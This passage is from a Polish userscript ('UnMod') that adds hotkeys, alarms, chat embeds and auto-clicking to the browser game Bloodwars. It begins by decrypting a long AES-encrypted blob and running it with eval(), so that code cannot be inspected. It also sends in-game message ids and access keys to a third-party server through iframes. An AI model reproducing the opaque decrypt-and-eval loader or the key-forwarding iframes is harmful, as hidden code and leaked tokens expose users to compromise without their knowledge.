RCOAjoHyiS9QTMgqgt18I3tYTZAIOQynKmJvsDQKAZderpqTRB65FO1bmL6cs3tYTJuyo5mhw6W5Vn9KCDb4kCbwoCT2CApISrwzxw7M/YVVg3HdxVLF8EXPBZuJ3CCNWJqDqh7WjtxRRqPyOuLsXm5jv/wk8KiefMJPuP/tF0j7/akwG7QeLNOPeXumQU2h2miVNK6qShpStAM2QF8/AqivVJc7T5jMYeRf8DAkpRX955by32XJzwQHfaX3wYDufoXgZ8H0i5+cMOwg5vT79VnegMxSOUGPVS5Qo+7nmotSPy7/+0Hk/sVkzAS/PrYkmwwZTI5FKyK5POQ9IEnoy8sBlC5xoYwYc2cE1nLWDo0f27VlqOYROL43T951cu8rE9eHirU3w4hjjDMB/jM2sgvBEen8iNfO86HJN2zwdftJEQwjz+QLH65CUy8y5tU7852CGGQ2gBrbt6cOWNDV/8gH29z5x3Qh498q4PCqbme8IX6uMcfnHlz0yBSpcrpu3PBtrukR4tN7x6RNXJvFvqsNERscgoUgk9p45NkJM8h02gRR803HDJqO1GCUPojJWhJSfEd9+qKNOwdfvWtcub2MtgmzYOVq31DYrAIBAnsBg7U4y+hIGc3+/7ssK/195oU4ngqGbxdqPk3P6gJ9G7GKSX1B+bbvA8Y25p6H41bRRpSjSs12Qt8lv8CMWBtUaNhW+ERx9jHmA13fthS3r1Tx3EhBTmNrDI0yMUIr8SB7K44nybYRyZTiviq302C78OGaN37HmkXittjVMlaVXH9vqHY00H0ttkEHg8KxnODYN+bxtOTelbgNqrIV1tOEVN9jGXu+6gClmXYnyfemSc/oEJCcNony1pZQrOGmenhOjrjh10Aj8j8rZQj/i9w3K8Bq+B5nF+1tXuEmtJ1RmGfnrRskJYf0ReD9Pei6RE3AZBW9yNZhZpsR3x3EhGwb1LpOxhJa8vZCveCLgHiV17TXTBE0lzAV1y4cu4kOfpFmSLYJMLk89e+G5pNznFPw1fybusqvHjO2JsfCerIK3njXS9Zw3VD2pjJyuwn5iKXjWmiWu1r57t6/DfgjPW43RLGgA+7Uho3oC7FPLdyiIXmnJCoOGGjSkz1oIR2utu7ldmuYIYr9Q4sz2ljucG4Fs897y3g1q37ZTPkVipodF7yuR+/lkBjjZceOr1fefjh6Bx4rIF1m7WH8k9Tg7atS4hfvonNue3w/BmDh/cxb6vWmLxAkOC9M6G2jveyQAY8wjNyDBaIJFaSJVxo9dU6VwZeLHcUPSUkTNbmEjXI4OpSQCu2QHuGkRfRwpwxzyUZYQNsg3ngu3RgwZgIltR9JbZ6uv5aDt/WX3WTtdDZVMLeWcIRAJ+Sx8McPUSu8Uwad7iox/mld7k6zre7LxNk8Q==';
        var decrypted = CryptoJS.AES.decrypt(encrypted, GM_getValue(id + 'UM_pass', '')).toString(CryptoJS.enc.Utf8);
      eval(decrypted);



















      }
      setInterval(function () {
        if (GM_getValue(id + 'UM_OP_alarm_on', false)) {
          if (document.getElementById('alm')) {
          } else {
            d = document.getElementById('content-mid');
            span = document.createElement('SPAN');
            span.id = 'alm';
            span.innerHTML = '<center style="font-size: 20px; font-weight: bold;"><a class="active" id="_alarm" href="javascript:">ALARM (kliknij by wyłączyć)</a><embed src="' + GM_getValue(id + 'UM_urlsound', 'http://mega.szajb.us/juenizer/unmod/sound.mp3') + '" hidden=true autostart=true loop=true></center><br>';
            d.insertBefore(span, d.firstChild);
            document.getElementById('_alarm').addEventListener('click', function () {
              GM_setValue(id + 'UM_OP_alarm_on', false);
              document.getElementById('alm').innerHTML = '';
              document.getElementById('alm').style.display = 'none';
            }, false);
          }
        } else {
          if (document.getElementById('alm')) {
            document.getElementById('alm').innerHTML = '';
            document.getElementById('alm').style.display = 'none';
          }
        }
      }, 2000);
      window.addEventListener('keydown', function (e) {
        var KeyID = (window.event) ? event.keyCode : e.keyCode;
        if (e.altKey) switch (KeyID) {
          case 48:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_0', 'auction');
            break;
          case 49:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_1', 'msg');
            break;
          case 50:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_2', 'aliance');
            break;
          case 51:
            3
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_3', 'equip');
            break;
          case 52:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_4', 'ambush');
            break;
          case 53:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_5', 'quest');
            break;
          case 54:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_6', 'cevent');
            break;
          case 55:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_7', 'swr');
            break;
          case 56:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_8', 'rank');
            break;
          case 57:
            window.location = '?a=' + GM_getValue(id + 'UM_OP_key_9', 'townview');
            break;
        }
      },
      true);
        var i = setInterval(function () {
          //document.getElementById('sbox_global_container').innerHTML = document.getElementById('sbox_global_container').innerHTML.replace(/&nbsp;<img src="gfx\/sbox_arrow.png" alt=" -> ">/g,":<BR>");
          sb = document.getElementById('sbox_global_container');
          a = sb.getElementsByTagName('a');
          for (i = 0; i < a.length; i++) {
            if ((a[i].href.substring(a[i].href.length - 4, a[i].href.length) == '.jpg' || a[i].href.substring(a[i].href.length - 4, a[i].href.length) == '.png' || a[i].href.substring(a[i].href.length - 4, a[i].href.length) == '.gif') && a[i].id != 'done') {
              a[i].id = 'done';
              iframe = document.createElement('IMG');
              iframe.width = '265';
              iframe.src = a[i].href;
              a[i].appendChild(iframe);
              unsafeWindow.scrollSbox('global');
            }
            if (a[i].href.substring(0, 23) == 'https://www.youtube.com' && a[i].id != 'done' && GM_getValue(id + 'UM_OP_youtube', true)) {
              a[i].id = 'done';
              iframe = document.createElement('IFRAME');
              iframe.width = '265';
              iframe.height = '199';
              iframe.frameBorder = '0';
              iframe.allowfullscreen = true;
              iframe.src = 'http://www.youtube.com/embed/' + a[i].href.substring(a[i].href.search('v=') + 2, a[i].href.search('v=') + 2 + 11);
              a[i].appendChild(iframe);
              unsafeWindow.scrollSbox('global');
            }
            if (a[i].href.search('bloodwars.interia.pl/showmsg') != -1 && a[i].href.search('mid=') != -1 && a[i].href.search('key=') != -1 && a[i].id != 'done') {
              a[i].id = 'done';
              iframe = document.createElement('IFRAME');
              iframe.width = '100%';
              iframe.height = '14';
              iframe.frameBorder = '0';
              iframe.allowfullscreen = true;
              iframe.scrolling = 'no';

              rid = a[i].href.substring(7,a[i].href.search('.bloodwars'));
              key = a[i].href.substring(a[i].href.search('key=')+4,a[i].href.search('key=')+20);
              mid = a[i].href.substring(a[i].href.search('mid=')+4,a[i].href.search('mid=')+20);
              mid = mid.substring(0,mid.search("&"));
              a[i].innerHTML='';
              iframe.src = "https://zk.nakoz.org/unmod/reader.php?id="+rid+"&key="+key+"&mid="+mid;
              a[i].appendChild(iframe);
              unsafeWindow.scrollSbox('global');
            }
          }
          sb = document.getElementById('sbox_clan_container');
          a = sb.getElementsByTagName('a');
          for (i = 0; i < a.length; i++) {
            if ((a[i].href.substring(a[i].href.length - 4, a[i].href.length) == '.jpg' || a[i].href.substring(a[i].href.length - 4, a[i].href.length) == '.png' || a[i].href.substring(a[i].href.length - 4, a[i].href.length) == '.gif') && a[i].id != 'done') {
              a[i].id = 'done';
              iframe = document.createElement('IMG');
              iframe.width = '265';
              iframe.src = a[i].href;
              a[i].appendChild(iframe);
              unsafeWindow.scrollSbox('clan');
            }
            if (a[i].href.substring(0, 23) == 'https://www.youtube.com' && a[i].id != 'done' && GM_getValue(id + 'UM_OP_youtube', true)) {
              a[i].id = 'done';
              iframe = document.createElement('IFRAME');
              iframe.width = '265';
              iframe.height = '199';
              iframe.frameBorder = '0';
              iframe.allowfullscreen = true;
              iframe.src = 'http://www.youtube.com/embed/' + a[i].href.substring(a[i].href.search('v=') + 2, a[i].href.search('v=') + 2 + 11);
              a[i].appendChild(iframe);
              unsafeWindow.scrollSbox('clan');
            }
            if (a[i].href.search('bloodwars.interia.pl/showmsg') != -1 && a[i].href.search('mid=') != -1 && a[i].href.search('key=') != -1 && a[i].id != 'done') {
              a[i].id = 'done';
              iframe = document.createElement('IFRAME');
              iframe.width = '100%';
              iframe.height = '14';
              iframe.frameBorder = '0';
              iframe.allowfullscreen = true;
              iframe.scrolling = 'no';

              rid = a[i].href.substring(7,a[i].href.search('.bloodwars'));
              key = a[i].href.substring(a[i].href.search('key=')+4,a[i].href.search('key=')+20);
              mid = a[i].href.substring(a[i].href.search('mid=')+4,a[i].href.search('mid=')+20);
              mid = mid.substring(0,mid.search("&"));
              a[i].innerHTML='';
              iframe.src = "https://zk.nakoz.org/unmod/reader.php?id="+rid+"&key="+key+"&mid="+mid;
              a[i].appendChild(iframe);
              unsafeWindow.scrollSbox('clan');
            }
          }
        }, 1000);
      //}
      div = '';
      inbox = false;
      jednorazy = false;
      div += '<div id="quick_tools4" onclick="jednorazyswitch" style="width: 40px; float: right; height: 20px; border: 1px solid gray; text-align: center; padding: 2px 10px; margin: 2px; cursor: pointer; position: relative; font-size: 14px;">1x</div>';
      div += '<div id="quick_tools3" onclick="inboxswitch" style="width: 40px; float: right; height: 20px; border: 1px solid gray; text-align: center; padding: 2px 10px; margin: 2px; cursor: pointer; position: relative;"><img style="position: absolute; height: 31px; top: -4px; left: 15px;" src="gfx/sbox_msg.png"></div>';
      div += '<div id="quick_tools" style="width: 40px; float: right; height: 20px; border: 1px solid gray; padding: 2px 10px; margin: 2px; cursor: pointer;"><select style="width: 44px; height: 20px; font-size: 8px;" name="toolbar" onchange="document.location.href=\'?a=equip&amp;akey=' + unsafeWindow.accessKey + '&amp;eqset=\'+this.value;"><option value="0">ZB</option>';
      for (x = 1; x <= 20; x++) {
        if (GM_getValue(id + 'OP_equip' + x, false)) {
          div += '<option style="font-size:12px;padding: 4px;" value="' + x + '">' + x + ': ' + GM_getValue(id + 'OP_equip' + x, false) + '</option>';
        }
      }
      div += '</select></div>';
      div += '<div id="quick_tools2" style="width: 40px; height: 20px; float: right; border: 1px solid gray; padding: 2px 10px; margin: 2px; cursor: pointer;"><select style="height: 20px; width: 44px; font-size: 8px;" name="toolbar2" onchange="document.location.href=\'?a=talizman&amp;do=main&amp;akey=' + unsafeWindow.accessKey + '&amp;equipSet=\'+this.value;"><option value="0">TA</option>';
      for (x = 1; x <= 10; x++) {
        if (GM_getValue(id + 'OP_talizman' + x, false)) {
          div += '<option style="font-size:12px;padding: 4px;" value="' + x + '">' + x + ': ' + GM_getValue(id + 'OP_talizman' + x, false) + '</option>';
        }
      }
      div += '</select></div>';
      divs = document.getElementById('sbox');
      divs.style.width = '400px';
      document.getElementById("sbox_global_input").style.width = '89%';
      document.getElementById("sbox_clan_input").style.width = '89%';
      document.getElementById("sbox_msg_global_i").style.marginTop = '-30px';
      document.getElementById("sbox_msg_clan_i").style.marginTop = '-30px';
      document.getElementById("sbox_msg_clan").style.width = '390px';
      document.getElementById("sbox_msg_global").style.width = '390px';
      document.getElementById("sbox_msg_clan").style.marginLeft = '4px';
      document.getElementById("sbox_msg_global").style.marginLeft = '4px';
      document.getElementById("sbox_clan_container").style.width = '100%';
      document.getElementById("sbox_global_container").style.width = '100%';
      divs.innerHTML += div;
      document.getElementById('quick_tools3').addEventListener('click', function () {
        if (inbox) {
          inbox = false;
          var z = (elem = document.getElementById('inboxmod')).parentNode.removeChild(elem);
        } else {
          if (jednorazy) {
            jednorazy = false;
           var z = (elem = document.getElementById('jednorazymod')).parentNode.removeChild(elem);
          }
          inbox = true;
          iframe = document.createElement('IFRAME');
          iframe.style.width = '340px';
          iframe.id = 'inboxmod';
          iframe.style.height = '500px';
          iframe.frameBorder = 'true';
          iframe.style.backgroundColor = 'black';
          iframe.style.position = 'fixed';
          iframe.style.bottom = '38px';
          iframe.style.zIndex = '10000';
          iframe.style.right = '7px';
          iframe.allowfullscreen = true;
          iframe.src = '?a=msg&unmod=true';
          document.getElementsByTagName('body') [0].appendChild(iframe);
        }
      }, false);


      document.getElementById('quick_tools4').addEventListener('click', function () {
        if (jednorazy) {
          jednorazy = false;
          var z = (elem = document.getElementById('jednorazymod')).parentNode.removeChild(elem);
        } else {
          if (inbox) {
            inbox = false;
           var z = (elem = document.getElementById('inboxmod')).parentNode.removeChild(elem);
          }
          jednorazy = true;
          iframe = document.createElement('IFRAME');
          iframe.style.width = '340px';
          iframe.id = 'jednorazymod';
          iframe.style.height = '500px';
          iframe.frameBorder = 'true';
          iframe.style.backgroundColor = 'black';
          iframe.style.position = 'fixed';
          iframe.style.bottom = '38px';
          iframe.style.zIndex = '10000';
          iframe.style.right = '7px';
          iframe.allowfullscreen = true;
          iframe.src = '?a=townshop&unmod=true';
          document.getElementsByTagName('body') [0].appendChild(iframe);
        }
      }, false);

      if (a.search('a=ambush&opt=atk') > 0) {
        b = document.getElementsByTagName('body') [0].innerHTML;
        if (b.search('Pozostało ataków: <b>') > 0) {
          GM_setValue(id + 'UM_pa', pozostalo_atakow = b.substring(b.search('Pozostało ataków: <b>') + 21, b.search('Pozostało ataków: <b>') + 23).replace('<', ''));
        }
      }
      if (a.search('a=quest') > 0) {
        b = document.getElementsByTagName('body') [0].innerHTML;
        if (b.search('Pozostało wypraw: <b>') > 0) {
          GM_setValue(id + 'UM_pw', pozostalo_wypraw = b.substring(b.search('Pozostało wypraw: <b>') + 21, b.search('Pozostało wypraw: <b>') + 23).replace('<', ''));
        }
      }
      if (a.search('eqset=') > 0) {
        q = a.substring(a.search('eqset=') + 6, a.search('eqset=') + 8).replace('&', '').replace('a', '');
        GM_setValue(id + 'UM_q', q);
      }
      document.body.appendChild(document.createElement('div'));
      przyp = '';
      var data = new Date();
      dzien = data.getDay();
      if (dzien == 0 || dzien == 1 || dzien == 4) {
        przyp = 'DZIŚ ARENY!<BR/><br/>Pozostało:<br/><b><div id="przyparen"></div></b><br/>';
      }
      document.body.lastChild.innerHTML = '<div style="position: fixed;left:2px;top:2px;">' + przyp + '</b><table border=0><tr><td><small>A:</small></td><td><small>' + GM_getValue(id + 'UM_pa', '?') + '</small></td></tr><tr><td><small>W:</small></td><td><small>' + GM_getValue(id + 'UM_pw', '?') + '</small></td></tr><tr><td><small>Q:</small></td><td><small>' + GM_getValue(id + 'UM_q', '?') + '</small></td></tr></table></div>';
      if (dzien == 0 || dzien == 1 || dzien == 4) {
        data2 = new Date();
        data2.setHours(21);
        data2.setMinutes(10);
        data2.setSeconds(0);
        if (data > data2) {
          document.getElementById('przyparen').innerHTML = 'KONIEC!';
        } else {
          unsafeWindow.gameTimers.registerTimer('przyparen', Math.floor((data2 - data) / 1000));
        }
      }
      if (GM_getValue('about', true)) {
        alert('Dziękuje za wybranie UnModa! Udanych dropów!\n~juen');
        notification('Dzięki temu obszarowi powiadomień będziesz na bieżąco z grą nawet nie mając przeglądarki na wierzchu! :)');
        GM_setValue('about', false);
      }
      wyprawalubatak = '';
      test = GM_getValue(id + 'UM_atak', 0);
      czas = 0;
      if (test > 0) {
        czas = test - Math.floor(Date.now() / 1000);
        tresc = 'ataku';
      }
      test = GM_getValue(id + 'UM_wyprawa', 0);
      if (test > 0) {
        czas = test - Math.floor(Date.now() / 1000);
        tresc = 'wyprawy';
      }
      if (czas > 0) {
        wyprawalubatak = '<a href="' + GM_getValue(id + 'UM_mid') + '"><div title=\'czas do końca ' + tresc + '\'  style="z-index: 1000; position: fixed; box-shadow: 2px 2px 4px black; line-height: 150%; right: 34px; top: 4px; border-radius: 100px;  font-size: 8px; color: yellow; font-weight: bold; padding: 6px; border-color: black; min-height: 15px; min-width: 15px; background-color: rgba(' + (tresc == 'wyprawy' ? '0,255,100' : '255,0,100') + ',0.8); text-align: center;" id="atakwyprawaint">' + czas + '</div></a>';
        var si = setInterval(function () {
          val = document.getElementById('atakwyprawaint').innerHTML;
          if (val > 0) {
            val--;
            document.getElementById('atakwyprawaint').innerHTML = val;
            if (val < 2) {
              document.getElementById('atakwyprawaint').className = 'blink'
            }
          } else if (val == 0) {
            val--;
            if (GM_getValue(id + 'UM_OP_donesound', false)) {
              document.body.appendChild(document.createElement('div'));
              document.body.lastChild.innerHTML = '<audio src="' + GM_getValue(id + 'UM_urlsound', 'http://mega.szajb.us/juenizer/unmod/sound.mp3') + '" autoplay=true></audio>';
            }
            clearInterval(si);
          }
        }, 1000);
      }
      document.body.appendChild(document.createElement('div')); document.body.lastChild.innerHTML = wyprawalubatak + '<div onclick="alert(conowego.split(\'^\').join(\'\\n\'))" style="z-index: 1000; position: fixed; line-height: 150%; cursor: pointer; box-shadow: 2px 2px 4px black; right: 4px; top: 4px; border-radius: 20px; width: 15px; height: 15px; font-size: 8px; color: black; font-weight: bold; padding: 6px; border-color: black; background-color: rgba(255,255,255,0.8); text-align: center;">?</div>';
      e = document.getElementsByClassName('stats-cash') [0].getElementsByClassName('panel-cell') [0].innerHTML.split('\n') [2].replace(/ /g, '').replace('PLN', '').replace('<br>', '').replace(/\t/g, '').replace(/<(?:.|\n)*?>/gm, '');
      add = document.getElementsByClassName('stats-cash') [0].getElementsByClassName('panel-cell') [0].innerHTML;
      add = add.substring(add.indexOf('+') + 1).replace(/ /g, '').replace('PLN/h', '').replace(/<(?:.|\n)*?>/gm, '');
      add = Math.floor(add / 900);
      if (e >= 19999) {
        e = document.getElementsByClassName('stats-cash') [0].getElementsByClassName('panel-cell') [0];
        e.innerHTML = '<a href=\'#\' id=\'kupzlom\'>' + e.innerHTML + '</a>';
        document.getElementById('kupzlom').addEventListener('click', function () {
          GM_setValue(id + 'UM_buy_junk', true);
          window.location = '?a=townshop';
        });
      }
      setInterval(function () {
        e = document.getElementsByClassName('stats-cash') [0].getElementsByClassName('panel-cell') [0].innerHTML;
        hajs = parseInt(e.substring(e.indexOf('Pieniądze') + 21, e.indexOf(' PLN')).replace(/ /g, '').replace('<br><spanstyle="font-size:10px;">', ''));
        hajs2 = hajs + add;
        hajs2 = hajs2.toFixed(0).replace(/./g, function (c, i, a) {
          return i && c !== '.' && ((a.length - i) % 3 === 0) ? ' ' + c : c;
        });
        txt = e.substring(0, e.indexOf('Pieniądze') + 21) + '<br><span style="font-size:10px;">' + hajs2 + e.substring(e.indexOf(' PLN'));
        if (hajs > 19999) {
          if (!document.getElementById('kupzlom')) {
            txt = '<a href=\'#\' id=\'kupzlom\'>' + txt + '</a>';
          }
          document.getElementsByClassName('stats-cash') [0].getElementsByClassName('panel-cell') [0].innerHTML = txt;
          document.getElementById('kupzlom').addEventListener('click', function () {
            GM_setValue(id + 'UM_buy_junk', true);
            window.location = '?a=townshop';
          });
        } else {
          document.getElementsByClassName('stats-cash') [0].getElementsByClassName('panel-cell') [0].innerHTML = txt;
        }
      }, 4000);
      if (GM_getValue('about__' + UM_VER.replace('.', '_'), true)) {
        alert(conowego);
        GM_setValue('about__' + UM_VER.replace('.', '_'), false);
      }
    }
    b = document.getElementsByClassName('time-effects') [0].getElementsByTagName('img');
    if (b.length) {
      b[0].addEventListener('click', function () {
        window.location = '?a=newarena&cat=4&t=silver';
      });
    }
    e = document.getElementsByClassName('stats-cash') [0].getElementsByClassName('panel-cell') [0].innerHTML;
    pln = parseInt(e.substring(e.indexOf('Pieniądze') + 21, e.indexOf(' PLN')).replace(/ /g, '').replace('<br><spanstyle="font-size:10px;">', ''));
    ark = document.getElementById('ark_15');
    if (ark && GM_getValue(id + 'UM_OP_ark15', false)) {
      ark.click();
    }
    ark = document.getElementById('ark_6');
    if (ark && GM_getValue(id + 'UM_OP_ark6', false)) {
      unsafeWindow.clickMax(6);
    }
    ark = document.getElementById('ark_4');
    if (ark && GM_getValue(id + 'UM_OP_ark4', false)) {
      unsafeWindow.clickMax(4);
    }
    ark = document.getElementById('ark_13');
    if (ark && GM_getValue(id + 'UM_OP_ark13', false)) {
      unsafeWindow.clickMax(13);
    }
    ark = document.getElementById('ark_3');
    if (ark && GM_getValue(id + 'UM_OP_ark3', false)) {
      unsafeWindow.clickMax(3);
    }
    ark = document.getElementById('ark_5');
    if (ark && GM_getValue(id + 'UM_OP_ark5', false)) {
      unsafeWindow.clickMax(5);
    }
    ark = document.getElementById('ark_7');
    if (ark && GM_getValue(id + 'UM_OP_ark7', false)) {
      unsafeWindow.clickMax(7);
    }
    ark = document.getElementById('ark_8');
    if (ark && GM_getValue(id + 'UM_OP_ark8', false)) {
      unsafeWindow.clickMax(8);
    }
    ark = document.getElementById('ark_14');
    if (ark && GM_getValue(id + 'UM_OP_ark14', false)) {
      unsafeWindow.clickMax(14);
    }
    ark = document.getElementById('ark_1');
    if (ark && GM_getValue(id + 'UM_OP_ark1', false)) {
      unsafeWindow.clickMax(1);
    }
    ark = document.getElementById('ark_2');
    if (ark && GM_getValue(id + 'UM_OP_ark2', false)) {
      unsafeWindow.clickMax(2);
    }
    ark = document.getElementById('ark_9');
    if (ark && GM_getValue(id + 'UM_OP_ark9', false)) {
      unsafeWindow.clickMax(9);
    }
    ark = document.getElementById('noExpOption');
    if (ark && GM_getValue(id + 'UM_OP_noexp', false)) {
      //notification("Zaznaczono rezygnacje z doswiadczenia!");
      ark.click();
    }
    onetime = document.getElementById('onetime');
    if (onetime && a.search('a=quest') == -1) {
      if (GM_getValue(id + 'UM_forcem', 0) === 0 && GM_getValue(id + 'UM_OP_jednoraz1', 0) > 0) {
        raz = GM_getValue(id + 'UM_OP_jednoraz1', 0);
        razt = GM_getValue(id + 'UM_OP_jednoraz1tier', 0);
        if (razt == 3) {
          koszt = 45000;
        } else if (razt == 2) {
          koszt = 22500;
        } else {
          koszt = 5000;
        }
        if (koszt > pln) {
          raz = GM_getValue(id + 'UM_OP_jednoraz2', 0);
          razt = GM_getValue(id + 'UM_OP_jednoraz2tier', 0);
          if (razt == 3) {
            koszt = 45000;
          } else if (razt == 2) {
            koszt = 22500;
          } else {
            koszt = 5000;
          }
          if (raz > 0) {
            if (koszt <= pln) {
              notification('Ustawiono zapasowy jednoraz');
              var scriptCode = new Array();
              scriptCode.push('document.getElementById("onetime").value=' + GM_getValue(id + 'UM_OP_jednoraz2', 0));
              var script = document.createElement('script');
              script.innerHTML = scriptCode.join('\n');
              scriptCode.length = 0;
              document.getElementsByTagName('head') [0].appendChild(script);
            } else {
              notification('Nie stac Cie na zaden jednoraz');
            }
          } else {
            notification('Nie stac Cie na jednoraz');
          }
        } else {
     //     notification('Ustawiono glowny jednoraz');
          var scriptCode = new Array();
          scriptCode.push('document.getElementById("onetime").value=' + GM_getValue(id + 'UM_OP_jednoraz1', 0));
          var script = document.createElement('script');
          script.innerHTML = scriptCode.join('\n');
          scriptCode.length = 0;
          document.getElementsByTagName('head') [0].appendChild(script);
        }
      }
    }


      GM_addStyle('#sbox_msg_global li {margin-top: 1px;padding-bottom: 5px !important; border-bottom: #000 dashed 0px;}');
      GM_addStyle('#sbox_msg_global img {display: block; opacity: 0; height: 2px;}');
      GM_addStyle('#sbox_msg_global span:nth-of-type(2) {margin-left: -4px;}');
      GM_addStyle('#sbox_msg_clan span:nth-of-type(2) {margin-left: -4px;}');
      GM_addStyle('#sbox_msg_clan li {margin-top: 1px;padding-bottom: 5px !important; border-bottom: #000 dashed 0px;}');
      GM_addStyle('#sbox_msg_clan img {display: block; opacity: 0; height: 2px;}');


    if (GM_getValue(id+'UM_trole','')=="60 52858 37931") {
      GM_setValue(id+'UM_trole','');
    }

    if (unsafeWindow.sboxClanId) {

          var html = document.createElement('form');
          html.style.position="absolute";
          html.action="?a=msg&do=clanmsg";
          html.method="post";
          html.style.width="100%";
          html.style.top="10px";
          html.style.textAlign="center";
          html.style.zIndex="10";
          html.innerHTML="<input type='text' name='topic'><input type='hidden' name='content' value='quick message sended via unmod'><input type='hidden' value='"+unsafeWindow.sboxClanId+"' name='msgClanId'><input type='submit' name='submitClanMsg' value='KLANÓWKA'>";

          document.getElementsByTagName('body')[0].appendChild(html);
    }
  } //unmodon

}
UNMOD();